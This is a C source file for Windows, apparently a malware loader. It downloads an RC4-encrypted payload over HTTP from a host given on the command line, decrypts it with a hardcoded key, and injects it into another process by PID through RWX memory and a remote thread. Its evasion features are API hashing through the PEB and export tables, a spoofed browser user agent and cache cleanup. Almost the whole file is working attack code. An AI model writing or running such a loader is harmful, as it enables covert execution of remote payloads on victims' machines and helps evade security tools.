#pragma comment(lib, "wininet.lib")

#include <Windows.h>
#include <wininet.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>

#define INITIAL_HASH 1258
#define INITIAL_SEED 8

DWORD HashStringDjb2W(_In_ PWCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}

DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}

HMODULE GetModuleHandleReplacementH(IN DWORD dwModuleHash)
{

    /*
    #ifdef _WIN64
            PTEB pTeb = (PTEB)__readgsword(0x30); // reads 0x30 btes from the GS register to reach a pinter to the TEB structure
            PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
    #elif _WIN32
        PPEB pPeb = (PEB*)(readfsdword(0x30));
    #endif
    */
    // Get PEB
    PTEB pTeb = (PTEB)__readgsqword(0x30); // reads 0x30 btes from the GS register to reach a pinter to the TEB structure
    PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;

    // Access PEB_LDR_DATA Ldr member (contains information about DLLs loaded in process)
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    // Get address of the InOrderMemoryModulelist
    PLIST_ENTRY pModuleList = &pLdr->InMemoryOrderModuleList;

    // Traverse the doubly-linked list (list is also circuarlly-linked)
    PLIST_ENTRY pEntry = pModuleList->Flink;
    PLDR_DATA_TABLE_ENTRY pEntryData = NULL;
    while (pEntry != pModuleList)
    {
        pEntryData = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        //wprintf(L"[+] \"%s\"\n", pEntryData->FullDllName.Buffer);
        if (HashStringDjb2W(pEntryData->FullDllName.Buffer) == dwModuleHash)
        {
            //wprintf(L"[+] FOUND: %s\tADDRESS: 0x%p\n", pEntryData->FullDllName.Buffer, pEntryData->DllBase);
            break;
        }
        pEntry = pEntry->Flink;
    }

    return (HMODULE)pEntryData->DllBase;
}

FARPROC GetProcAddressReplacementH(IN HMODULE hModule, IN DWORD dwApiHash) 
{

    // We do this to avoid casting at each time we use 'hModule'
    PBYTE pBase = (PBYTE)hModule;

    // Getting the dos header and doing a signature check
    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // Getting the nt headers and doing a signature check
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // Getting the optional header
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;

    // Getting the image export table
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Getting the function's names array pointer
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);

    // Getting the function's addresses array pointer
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

    // Getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


    // Looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) 
    {

        // Getting the name of the function
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

        // Getting the address of the function through its ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // Searching for the function specified
        if (HashStringDjb2A(pFunctionName) == dwApiHash) 
        {
            //printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return pFunctionAddress;
        }
    }

    return NULL;
}


// this is what SystemFunction032 function take as a parameter
typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) 
{

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) 
    {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

unsigned char Rc4Key[] = { 0x79, 0x9B, 0xA0, 0x83, 0x77, 0x76, 0xDA, 0xB7, 0x73, 0xF7, 0x31, 0x62, 0xA3, 0x14, 0x15, 0x42 };

struct memory
{
    char* buff;
    size_t prevSize;
};

// Error Checking function for HINTERNET
void hErrorCheck(const HINTERNET handle, const LPCSTR funcName)
{
    if (handle == NULL)
    {
        const DWORD errorCode = GetLastError();
        printf("%s failed with %lu\n", funcName, errorCode);
        //getchar();
        exit(-1);
    }
    //printf("[*] %s works!\n", funcName);
}

// Error checking for BOOL
void bErrorCheck(const BOOL ret, const LPCSTR funcName)
{
    if (ret == FALSE)
    {
        const int errorCode = GetLastError();
        printf("%s failed with %d\n", funcName, errorCode);
        //getchar();
        exit(-1);
    }
    //printf("[*] %s works!\n", funcName);
}


int main(int argc, char* argv[])
{
    // TODO: causes process to have two handles to kernel32.dll, probably a way to use the handle that the process starts with instead.
    typedef HANDLE (WINAPI* POPENPROCESS)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
    POPENPROCESS pOpenProcess = (POPENPROCESS)GetProcAddressReplacementH(GetModuleHandleW(L"kernel32.dll"), 3700589403);

    typedef LPVOID (WINAPI* PVAEX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);   
    PVAEX pVAEX = (PVAEX)GetProcAddressReplacementH(GetModuleHandleW(L"kernel32.dll"), 4276769145);

    typedef BOOL (WINAPI* PWPMEM)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);
    PWPMEM pWPMEM = (PWPMEM)GetProcAddressReplacementH(GetModuleHandleW(L"kernel32.dll"), 2198219085);

    typedef HANDLE (WINAPI* PCRT)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,LPDWORD lpThreadId);
    PCRT pCRT = (PCRT)GetProcAddressReplacementH(GetModuleHandleW(L"kernel32.dll"), 2339962882);

    

    // Set user agent and get handle for other wininet function
    const HINTERNET hOpen = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hErrorCheck(hOpen, "InternetOpenA");

    // Get handle to the session if connection is successfull
    const HINTERNET hConnect = InternetConnectA(hOpen, argv[1], 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    hErrorCheck(hConnect, "InternetConnectA");

    // Get an http request handle
    //char **acceptTypes = { "text/*", NULL };
    const HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", argv[2], "HTTP/1.0", NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    hErrorCheck(hRequest, "InternetOpenRequestA");

    // Send request to the http server
    const BOOL bRequest = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    bErrorCheck(bRequest, "HttpSendRequestA");


    DWORD bytesAvailable;
    DWORD bytesRead;
    struct memory chunk;
    chunk.buff = malloc(1); // Grows as need by realloc
    chunk.prevSize = 0; // Currently holding no data

    // Gets available bytes and stores them in "bytesAvailable
    while (InternetQueryDataAvailable(hRequest, &bytesAvailable, 0, 0))
    {
        // Allocates memory of size bytesAvailable
        char* pMessageBody = malloc(bytesAvailable + 1);
        if (pMessageBody == NULL)
        {
            printf("Malloc failed\n");
            exit(-1);
        }

        // Reads response body into pMessageBody
        const BOOL bFile = InternetReadFile(hRequest, pMessageBody, bytesAvailable, &bytesRead);
        bErrorCheck(bFile, "InernetReadFile");

        // Reallocate chunk->buff to hold newly copied data with old data
        char* ptr = realloc(chunk.buff, chunk.prevSize + bytesRead + 1);
        if (ptr == NULL)
        {
            printf("Realloc failed\n");
            exit(-1);
        }
        chunk.buff = ptr;

        // Copy retreived data after previously retrieved data
        memcpy(&(chunk.buff[chunk.prevSize]), pMessageBody, bytesRead);
        chunk.prevSize += bytesRead;
        //chunk.buff[chunk.prevSize] = '0';

        // Freeing allocated memory
        free(pMessageBody);

        // Read 0 means end of file
        if (bytesRead == 0)
            break;
    }
    //printf("%s", chunk.buff);

    // Open handle to PID in argv[3]
    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[3]));
    if (hProc == NULL)
    {
        //printf("[!] OpenProcess failed with: %lu\n", GetLastError());
        exit(-1);
    }

    LPVOID pRemoteBuff = pVAEX(hProc, NULL, chunk.prevSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuff == NULL)
    {
        //printf("[!] VirtualAllocEx failed with: %lu\n", GetLastError());
        exit(-1);
    }
    Rc4EncryptionViSystemFunc032(Rc4Key, chunk.buff, sizeof(Rc4Key), chunk.prevSize);

    if (pWPMEM(hProc, pRemoteBuff, chunk.buff, chunk.prevSize, NULL) == 0)
    {
        //printf("[!] WriteProcessMemory failed with: %lu", GetLastError());
        exit(-1);
    }

    HANDLE hProcThread = pCRT(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuff, NULL, 0, NULL);
    if (hProcThread == NULL)
    {
        printf("[!] CreateRemoteThread failed with: %lu", GetLastError());
        exit(-1);
    }

    // Cleanup
    DeleteUrlCacheEntryA(argv[1]);
    InternetCloseHandle(hOpen);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);
    CloseHandle(hProc);
    CloseHandle(hProcThread);
    free(chunk.buff);
    

    return 0;
}
